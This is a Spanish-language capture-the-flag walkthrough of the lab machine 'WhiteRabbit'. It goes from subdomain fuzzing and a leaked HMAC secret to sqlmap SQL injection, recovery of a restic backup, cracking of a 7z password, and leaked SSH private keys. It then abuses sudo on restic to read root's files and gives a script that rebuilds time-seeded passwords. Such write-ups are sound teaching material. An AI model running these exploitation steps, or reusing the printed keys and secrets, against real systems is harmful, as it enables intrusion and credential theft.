>Primero realizamos un escaneo de Nmap de los puertos TCP de la máquina víctima:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/whiterabbit]
└─$ sudo nmap -p- -sS -Pn -n --open --min-rate 5000 -sV 10.10.11.63
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-20 12:06 EST
Nmap scan report for 10.10.11.63
Host is up (0.066s latency).
Not shown: 60120 closed tcp ports (reset), 5412 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Caddy httpd
2222/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.66 seconds
```

>Agregamos los nombres de dominio encontrados en el escaneo al resolutor local para poder resolver sus nombres DNS:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/whiterabbit]
└─$ echo "10.10.11.63 whiterabbit.htb" >> /etc/hosts
```

>Vamos a realizar fuzzing de subdominios con ffuf, donde vamos a encontrar el subdominio `status`:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/whiterabbit]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://whiterabbit.htb -H 'Host: FUZZ.whiterabbit.htb' -fw 1 -t 300 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://whiterabbit.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.whiterabbit.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 1
________________________________________________

status                  [Status: 302, Size: 32, Words: 4, Lines: 1, Duration: 75ms]
:: Progress: [114442/114442] :: Job [1/1] :: 4629 req/sec :: Duration: [0:00:31] :: Errors: 0 ::
```

>Accedemos a `status.whiterabbit.htb` y vemos una instancia de Uptime Kuma:

<img width="1468" height="465" alt="image" src="https://github.com/user-attachments/assets/8f0271a7-5f86-4ffa-8fd2-715f0495e9b7" />

>Al enumerar directorios con ffuf, vemos una ruta: `/status/temp`

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/whiterabbit]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://status.whiterabbit.htb/status/FUZZ -t 3000 -fw 247,1

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://status.whiterabbit.htb/status/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 3000
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 247,1
________________________________________________

temp                    [Status: 200, Size: 3359, Words: 304, Lines: 41, Duration: 131ms]
```

>Al acceder via web, vemos que nos da los nombres de varios subdominios:

<img width="1298" height="729" alt="image" src="https://github.com/user-attachments/assets/04ab107d-f9b0-4cee-8a07-0ac32997b62f" />

>Si investigamos en el subdominio de wikijs, encontraremos otro subdominio más:

<img width="1472" height="653" alt="image" src="https://github.com/user-attachments/assets/a1f955a7-a7bd-415f-9f18-e673b57dc979" />

>Vemos que ese subdominio nos lleva a una instancia de `n8n` que tiene una versión relativamente vieja:

<img width="1081" height="216" alt="image" src="https://github.com/user-attachments/assets/ffecd2ef-b688-470f-9de4-d7e73e924459" />

>Al descargar el archivo JSON que nos deja el wikijs sobre gophish, vemos un secret:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/whiterabbit]
└─$ cat gophish_to_phishing_score_database.json        

<SNIP>

    {
      "parameters": {
        "action": "hmac",
        "type": "SHA256",
        "value": "={{ JSON.stringify($json.body) }}",
        "dataPropertyName": "calculated_signature",
        "secret": "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
      },

<SNIP>
```

>Vemos que la aplicación en el ejemplo valida con una `signature HMAC` del cuerpo de la petición si es válida, para ello deberemos emplear el secret anterior

>Emplearemos el siguiente proxy que realiza el signature a las peticiones que le lleguen:

```python
# gophish_sign.py
from mitmproxy import http
import json
import hmac
import hashlib

SECRET = b"3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"

def request(flow: http.HTTPFlow):
    if flow.request.path.startswith("/webhook/") and flow.request.method == "POST":
        try:
            raw_data = flow.request.get_content()
            signature = hmac.new(SECRET, raw_data, hashlib.sha256).hexdigest()
            flow.request.headers["x-gophish-signature"] = f"sha256={signature}"
        except Exception as e:
            flow.request.headers["x-gophish-signature"] = "error-signing"
```

>Ponemos en marcha el proxy empleando el script con `mitmproxy`:

```bash
mitmproxy -s gophish_sign.py --mode reverse:http://28efa8f7df.whiterabbit.htb --listen-port 8080
```

>Probamos SQLi en la petición que sale en el ejemplo de wikijs empleando `sqlmap` y redireccionando las peticiones a nuestro proxy y vemos que es vulnerable a `SQL Injection Boolean-Based Blind`:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/whiterabbit]
└─$ sqlmap -u "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d" --data='{"campaign_id":1,"email":"*","message":"Clicked Link"}' --headers="Content-Type: application/json" --proxy="http://127.0.0.1:8080" --random-agent --batch --technique=BE --time-sec=3 --dbs 
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.8#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|                                                                                                                                                
      |_|V...       |_|   https://sqlmap.org                                                                                                                             

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:20:22 /2025-11-20/

[13:20:22] [INFO] fetched random HTTP User-Agent header value 'Opera/9.25 (Windows NT 5.1; U; de)' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[13:20:22] [INFO] testing connection to the target URL
[13:20:23] [INFO] checking if the target is protected by some kind of WAF/IPS
[13:20:23] [INFO] testing if the target URL content is stable
[13:20:23] [INFO] target URL content is stable
[13:20:23] [INFO] testing if (custom) POST parameter 'JSON #1*' is dynamic
[13:20:23] [WARNING] (custom) POST parameter 'JSON #1*' does not appear to be dynamic
[13:20:24] [INFO] heuristic (basic) test shows that (custom) POST parameter 'JSON #1*' might be injectable (possible DBMS: 'MySQL')
[13:20:24] [INFO] testing for SQL injection on (custom) POST parameter 'JSON #1*'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[13:20:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:20:30] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[13:20:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[13:20:37] [WARNING] reflective value(s) found and filtering out
[13:20:44] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[13:21:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[13:21:24] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[13:21:26] [INFO] (custom) POST parameter 'JSON #1*' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable 
[13:21:26] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[13:21:27] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[13:21:27] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[13:21:27] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[13:21:27] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[13:21:28] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[13:21:28] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[13:21:29] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[13:21:32] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:21:32] [INFO] (custom) POST parameter 'JSON #1*' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
(custom) POST parameter 'JSON #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 162 HTTP(s) requests:
---
Parameter: JSON #1* ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: {"campaign_id":1,"email":"" RLIKE (SELECT (CASE WHEN (6043=6043) THEN '' ELSE 0x28 END))-- NyXE","message":"Clicked Link"}

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: {"campaign_id":1,"email":"" AND (SELECT 3100 FROM(SELECT COUNT(*),CONCAT(0x7176707171,(SELECT (ELT(3100=3100,1))),0x716b626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- NpOj","message":"Clicked Link"}
---
[13:21:32] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[13:21:37] [INFO] fetching database names
[13:21:37] [INFO] retrieved: 'information_schema'
[13:21:38] [INFO] retrieved: 'phishing'
[13:21:38] [INFO] retrieved: 'temp'
available databases [3]:
[*] information_schema
[*] phishing
[*] temp

[13:21:38] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/28efa8f7df.whiterabbit.htb'

[*] ending @ 13:21:38 /2025-11-20/
```

>Aquí encontramos en la base de datos `temp` un subdominio nuevo y unas credenciales de `restic`:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/whiterabbit]
└─$ sqlmap -u "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d" --data='{"campaign_id":1,"email":"*","message":"Clicked Link"}' --headers="Content-Type: application/json" --proxy="http://127.0.0.1:8080" --random-agent --batch --technique=BE --time-sec=3 --dump -T command_log -D temp
        ___
       __H__                                                                                                                                                             
 ___ ___[.]_____ ___ ___  {1.9.8#stable}                                                                                                                                 
|_ -| . [,]     | .'| . |                                                                                                                                                
|___|_  [.]_|_|_|__,|  _|                                                                                                                                                
      |_|V...       |_|   https://sqlmap.org                                                                                                                             

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:25:42 /2025-11-20/

[13:25:42] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.8.0.6) Gecko/20060728 Firefox/1.5.0.6' from file '/usr/share/sqlmap/data/txt/user-agents.txt'                                                                                                                                            
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[13:25:42] [INFO] resuming back-end DBMS 'mysql' 
[13:25:42] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON #1* ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: {"campaign_id":1,"email":"" RLIKE (SELECT (CASE WHEN (6043=6043) THEN '' ELSE 0x28 END))-- NyXE","message":"Clicked Link"}

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: {"campaign_id":1,"email":"" AND (SELECT 3100 FROM(SELECT COUNT(*),CONCAT(0x7176707171,(SELECT (ELT(3100=3100,1))),0x716b626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- NpOj","message":"Clicked Link"}
---
[13:25:42] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[13:25:42] [INFO] fetching columns for table 'command_log' in database 'temp'
[13:25:42] [INFO] resumed: 'id'
[13:25:42] [INFO] resumed: 'int(11)'
[13:25:42] [INFO] resumed: 'command'
[13:25:42] [INFO] resumed: 'varchar(255)'
[13:25:42] [INFO] resumed: 'date'
[13:25:42] [INFO] resumed: 'timestamp'
[13:25:42] [INFO] fetching entries for table 'command_log' in database 'temp'
[13:25:43] [WARNING] reflective value(s) found and filtering out
[13:25:43] [INFO] retrieved: '2024-08-30 10:44:01'
[13:25:44] [INFO] retrieved: 'uname -a'
[13:25:44] [INFO] retrieved: '1'
[13:25:44] [INFO] retrieved: '2024-08-30 11:58:05'
[13:25:45] [INFO] retrieved: 'restic init --repo rest:http://75951e6ff.whiterabbit.htb'
[13:25:45] [INFO] retrieved: '2'
[13:25:46] [INFO] retrieved: '2024-08-30 11:58:36'
[13:25:46] [INFO] retrieved: 'echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd'
[13:25:47] [INFO] retrieved: '3'
[13:25:47] [INFO] retrieved: '2024-08-30 11:59:02'
[13:25:47] [INFO] retrieved: 'rm -rf .bash_history '
[13:25:48] [INFO] retrieved: '4'
[13:25:48] [INFO] retrieved: '2024-08-30 11:59:47'
[13:25:48] [INFO] retrieved: '#thatwasclose'
[13:25:49] [INFO] retrieved: '5'
[13:25:49] [INFO] retrieved: '2024-08-30 14:40:42'
[13:25:50] [INFO] retrieved: 'cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd'
[13:25:50] [INFO] retrieved: '6'
Database: temp
Table: command_log
[6 entries]
+----+---------------------+------------------------------------------------------------------------------+
| id | date                | command                                                                      |
+----+---------------------+------------------------------------------------------------------------------+
| 1  | 2024-08-30 10:44:01 | uname -a                                                                     |
| 2  | 2024-08-30 11:58:05 | restic init --repo rest:http://75951e6ff.whiterabbit.htb                     |
| 3  | 2024-08-30 11:58:36 | echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd                       |
| 4  | 2024-08-30 11:59:02 | rm -rf .bash_history                                                         |
| 5  | 2024-08-30 11:59:47 | #thatwasclose                                                                |
| 6  | 2024-08-30 14:40:42 | cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd |
+----+---------------------+------------------------------------------------------------------------------+

[13:25:50] [INFO] table 'temp.command_log' dumped to CSV file '/home/kali/.local/share/sqlmap/output/28efa8f7df.whiterabbit.htb/dump/temp/command_log.csv'
[13:25:50] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/28efa8f7df.whiterabbit.htb'

[*] ending @ 13:25:50 /2025-11-20/
```

>Ahora vamos a listar el contenido de la snapshot de restic:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/whiterabbit]
└─$ echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd
                                                                                                                                                                         
┌──(kali㉿jbkira)-[~/Desktop/machines/whiterabbit]
└─$ restic -r rest:http://75951e6ff.whiterabbit.htb --password-file .restic_passwd snapshots
repository 5b26a938 opened (version 2, compression level auto)
created new cache in /home/kali/.cache/restic
ID        Time                 Host         Tags        Paths
------------------------------------------------------------------------
272cacd5  2025-03-06 19:18:40  whiterabbit              /dev/shm/bob/ssh
------------------------------------------------------------------------
1 snapshots
                                                                                                                                                                         
┌──(kali㉿jbkira)-[~/Desktop/machines/whiterabbit]
└─$ restic -r rest:http://75951e6ff.whiterabbit.htb --password-file .restic_passwd ls 272cacd5
repository 5b26a938 opened (version 2, compression level auto)
[0:00] 100.00%  5 / 5 index files loaded
snapshot 272cacd5 of [/dev/shm/bob/ssh] at 2025-03-06 17:18:40.024074307 -0700 -0700 by ctrlzero@whiterabbit filtered by []:
/dev
/dev/shm
/dev/shm/bob
/dev/shm/bob/ssh
/dev/shm/bob/ssh/bob.7z
```

>Nos descargamos los archivos encontrados en el restic:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/whiterabbit]
└─$ restic -r rest:http://75951e6ff.whiterabbit.htb --password-file .restic_passwd restore 272cacd5 --target .       
repository 5b26a938 opened (version 2, compression level auto)
[0:00] 100.00%  5 / 5 index files loaded
restoring snapshot 272cacd5 of [/dev/shm/bob/ssh] at 2025-03-06 17:18:40.024074307 -0700 -0700 by ctrlzero@whiterabbit to .
Summary: Restored 5 files/dirs (572 B) in 0:00
```

>Hacemos un 7z2john para crackear la contraseña del 7z encontrado:

```bash
┌──(kali㉿jbkira)-[~/…/dev/shm/bob/ssh]
└─$ 7z2john bob.7z               
ATTENTION: the hashes might contain sensitive encrypted data. Be careful when sharing or posting these hashes
bob.7z:$7z$2$19$0$$8$61d81f6f9997419d0000000000000000$4049814156$368$365$7295a784b0a8cfa7d2b0a8a6f88b961c8351682f167ab77e7be565972b82576e7b5ddd25db30eb27137078668756bf9dff5ca3a39ca4d9c7f264c19a58981981486a4ebb4a682f87620084c35abb66ac98f46fd691f6b7125ed87d58e3a37497942c3c6d956385483179536566502e598df3f63959cf16ea2d182f43213d73feff67bcb14a64e2ecf61f956e53e46b17d4e4bc06f536d43126eb4efd1f529a2227ada8ea6e15dc5be271d60360ff5c816599f0962fc742174ff377e200250b835898263d997d4ea3ed6c3fc21f64f5e54f263ebb464e809f9acf75950db488230514ee6ed92bd886d0a9303bc535ca844d2d2f45532486256fbdc1f606cca1a4680d75fa058e82d89fd3911756d530f621e801d73333a0f8419bd403350be99740603dedff4c35937b62a1668b5072d6454aad98ff491cb7b163278f8df3dd1e64bed2dac9417ca3edec072fb9ac0662a13d132d7aa93ff58592703ec5a556be2c0f0c5a3861a32f221dcb36ff3cd713$399$00
```

```bash
┌──(kali㉿jbkira)-[~/…/dev/shm/bob/ssh]
└─$ john -w=/usr/share/wordlists/rockyou.txt 7z_hash         
Using default input encoding: UTF-8
Loaded 1 password hash (7z, 7-Zip archive encryption [SHA256 128/128 AVX 4x AES])
Cost 1 (iteration count) is 524288 for all loaded hashes
Cost 2 (padding size) is 3 for all loaded hashes
Cost 3 (compression type) is 2 for all loaded hashes
Cost 4 (data length) is 365 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1q2w3e4r5t6y     (bob.7z)     
1g 0:00:05:16 DONE (2025-11-20 13:42) 0.003158g/s 75.28p/s 75.28c/s 75.28C/s 200200..150390
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

>Lo descomprimimos y vemos los siguientes archivos:

```bash
┌──(kali㉿jbkira)-[~/…/dev/shm/bob/ssh]
└─$ cat config 
Host whiterabbit
  HostName whiterabbit.htb
  Port 2222
  User bob
                                                                                                                                                                         
┌──(kali㉿jbkira)-[~/…/dev/shm/bob/ssh]
└─$ cat bob   
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBvDTUyRwF4Q+A2imxODnY8hBTEGnvNB0S2vaLhmHZC4wAAAJAQ+wJXEPsC
VwAAAAtzc2gtZWQyNTUxOQAAACBvDTUyRwF4Q+A2imxODnY8hBTEGnvNB0S2vaLhmHZC4w
AAAEBqLjKHrTqpjh/AqiRB07yEqcbH/uZA5qh8c0P72+kSNW8NNTJHAXhD4DaKbE4OdjyE
FMQae80HRLa9ouGYdkLjAAAACXJvb3RAbHVjeQECAwQ=
-----END OPENSSH PRIVATE KEY-----
                                                                                                                                                                         
┌──(kali㉿jbkira)-[~/…/dev/shm/bob/ssh]
└─$ cat bob.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG8NNTJHAXhD4DaKbE4OdjyEFMQae80HRLa9ouGYdkLj root@lucy
```

>Usamos su clave privada y nos conectamos al contenedor por ssh:

```bash
┌──(kali㉿jbkira)-[~/…/dev/shm/bob/ssh]
└─$ ssh bob@10.10.11.63 -p 2222 -i bob
The authenticity of host '[10.10.11.63]:2222 ([10.10.11.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:jWKKPrkxU01KGLZeBG3gDZBIqKBFlfctuRcPBBG39sA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.11.63]:2222' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Thu Nov 20 07:41:25 2025 from 10.10.17.110
bob@ebdce80611e9:~$
```

>Vemos que el usuario bob puede emplear restic como el usuario root sin contraseña:

```bash
bob@ebdce80611e9:~$ sudo -l
Matching Defaults entries for bob on ebdce80611e9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User bob may run the following commands on ebdce80611e9:
    (ALL) NOPASSWD: /usr/bin/restic
```

>Usaremos restic para hacer un backup de /root/ y dumpearlo:

```bash
# Creamos el repo
bob@ebdce80611e9:/tmp$ sudo /usr/bin/restic init --repo .
enter password for new repository: 
enter password again: 
created restic repository f076e7b2e9 at .

Please note that knowledge of your password is required to access
the repository. Losing your password means that your data is
irrecoverably lost.

# Añadimos un backup de root al repo
bob@ebdce80611e9:/tmp$ sudo /usr/bin/restic --repo . backup /root/
enter password for repository: 
repository f076e7b2 opened (version 2, compression level auto)
created new cache in /root/.cache/restic
no parent snapshot found, will read all files


Files:           4 new,     0 changed,     0 unmodified
Dirs:            3 new,     0 changed,     0 unmodified
Added to the repository: 6.493 KiB (3.603 KiB stored)

processed 4 files, 3.865 KiB in 0:00
snapshot c209316e saved

# Listamos las snapshots
bob@ebdce80611e9:/tmp$ sudo /usr/bin/restic --repo . snapshots
enter password for repository: 
repository f076e7b2 opened (version 2, compression level auto)
ID        Time                 Host          Tags        Paths
--------------------------------------------------------------
c209316e  2025-11-20 18:49:56  ebdce80611e9              /root
--------------------------------------------------------------
1 snapshots

# Listamos el contenido de la snapshot
bob@ebdce80611e9:/tmp$ sudo /usr/bin/restic --repo . ls c209316e
enter password for repository: 
repository f076e7b2 opened (version 2, compression level auto)
[0:00] 100.00%  1 / 1 index files loaded
snapshot c209316e of [/root] filtered by [] at 2025-11-20 18:49:56.6588209 +0000 UTC):
/root
/root/.bash_history
/root/.bashrc
/root/.cache
/root/.profile
/root/.ssh
/root/morpheus
/root/morpheus.pub

# Leemos la clave ssh de morpheus
bob@ebdce80611e9:/tmp$ sudo /usr/bin/restic --repo . dump latest /root/morpheus
enter password for repository: 
repository f076e7b2 opened (version 2, compression level auto)
[0:00] 100.00%  1 / 1 index files loaded
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQS/TfMMhsru2K1PsCWvpv3v3Ulz5cBP
UtRd9VW3U6sl0GWb0c9HR5rBMomfZgDSOtnpgv5sdTxGyidz8TqOxb0eAAAAqOeHErTnhx
K0AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL9N8wyGyu7YrU+w
Ja+m/e/dSXPlwE9S1F31VbdTqyXQZZvRz0dHmsEyiZ9mANI62emC/mx1PEbKJ3PxOo7FvR
4AAAAhAIUBairunTn6HZU/tHq+7dUjb5nqBF6dz5OOrLnwDaTfAAAADWZseEBibGFja2xp
c3QBAg==
-----END OPENSSH PRIVATE KEY-----
```

>Nos conectamos por ssh a la máquina original con la clave ssh obtenida y tenemos la user flag:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/whiterabbit]
└─$ chmod 600 morpheus_id_rsa 
                                                                                                                                                                         
┌──(kali㉿jbkira)-[~/Desktop/machines/whiterabbit]
└─$ ssh morpheus@10.10.11.63 -i morpheus_id_rsa 
The authenticity of host '10.10.11.63 (10.10.11.63)' can't be established.
ED25519 key fingerprint is SHA256:F9XNz/rgt655Q1XKkL6at11Zy5IXAogAEH95INEOrIE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.63' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Nov 20 18:54:27 2025 from 10.10.14.226
morpheus@whiterabbit:~$ cat user.txt 
3aeb791c1f3df5bdfefa4b9fc2f89652
```

>Vemos que existe otro usuario llamado neo en la máquina:

```bash
morpheus@whiterabbit:/home$ ls
morpheus  neo
```

>Vemos un binario que sirve para crear contraseñas para el usuario neo:

```bash
morpheus@whiterabbit:/home$ ll /opt/neo-password-generator/
total 24
drwxr-xr-x 2 root root  4096 Aug 30  2024 ./
drwxr-xr-x 5 root root  4096 Aug 30  2024 ../
-rwxr-xr-x 1 root root 15656 Aug 30  2024 neo-password-generator*
```

>Nos lo traemos a la máquina atacante local y vemos que genera contraseñas aleatorias cada vez así que vamos a tener que hacerle reversing para ver que patrón puede seguir:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/whiterabbit]
└─$ ./neo-password-generator       
qkTbIuqSdva3SjCYj4Tn
                                                                                                                                                                         
┌──(kali㉿jbkira)-[~/Desktop/machines/whiterabbit]
└─$ ./neo-password-generator
vlEt53t7iV5pfDxMsxhS
                                                                                                                                                                         
┌──(kali㉿jbkira)-[~/Desktop/machines/whiterabbit]
└─$ ./neo-password-generator
Ni5mQF0uQN6W4OeIGwV8
```

>Le hacemos reversing y vemos que hay una función llamada `generate_password` que muestra que criterios emplea para crearla:

<img width="1368" height="677" alt="image" src="https://github.com/user-attachments/assets/4f1a0258-bebf-4684-898d-8e4034abaa05" />

>Además, en el `main`, vemos que se emplea `time-based pseudo-random number generation` para crear la contraseña:

<img width="1447" height="502" alt="image" src="https://github.com/user-attachments/assets/9427feff-fbfe-4f0a-be54-d39aa37c349c" />

>Entonces vamos a crearnos una wordlist que contenga todas las contraseñas posibles con esas condiciones, para ello usamos el siguiente script, el tiempo exacto de ejecución se mostró en la base de datos al hacer la SQL Injection:

```python
from ctypes import CDLL
import datetime

# Carga la librería estándar de C para usar srand() y rand()
libc = CDLL("libc.so.6")

# Timestamp del momento exacto (2024-08-30 14:40:42 UTC)
# cuando se SUPONE que se generó la contraseña real (Obtenido de la base de datos)
seconds = datetime.datetime(2024, 8, 30, 14, 40, 42, 
           tzinfo=datetime.timezone(datetime.timedelta(0))).timestamp()

# Prueba 1000 posibilidades de microsegundos (0-999)
for i in range(0,1000):
    password = ""  # Reinicia la contraseña
    
    # Calcula la semilla POTENCIAL usada en ese momento
    # int(timestamp_en_ms + microsegundos)
    microseconds = i
    current_seed_value = int(seconds * 1000 + microseconds)
    
    # Inicializa el generador de números aleatorios de C con esa semilla
    libc.srand(current_seed_value)
    
    # Genera 20 caracteres de contraseña
    for j in range(0,20):
        # Obtiene un número pseudoaleatorio (0 a RAND_MAX)
        rand_int = libc.rand()
        
        # Mapea el número a un charset: a-zA-Z0-9 (62 caracteres)
        char_set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        password += char_set[rand_int % 62]  # Usa módulo para indexar
    
    print(password)
```

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/whiterabbit]
└─$ python3 password_list.py > password_list
```

